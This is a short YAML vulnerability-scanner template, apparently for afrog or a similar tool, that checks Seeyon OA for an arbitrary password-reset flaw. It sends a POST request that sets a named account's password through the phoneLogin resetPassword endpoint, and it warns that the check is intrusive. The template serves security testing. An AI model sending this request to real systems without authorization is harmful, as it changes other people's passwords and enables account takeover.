id: seeyon-resetpassword

info:
  name: Seeyon resetPassword Arbitrary Password Change
  author: local
  severity: high
  description: This active check may modify the password of the named account. Use only with explicit authorization.
  tags: seeyon,zhiyuan,credentials,active,intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/seeyon/rest/phoneLogin/phoneCode/resetPassword"
    headers:
      Content-Type: application/json
    body: |
      {"loginName":"afrogtest","password":"admin@123456"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - '"success" : false'
          - '"message" : null'
        condition: and

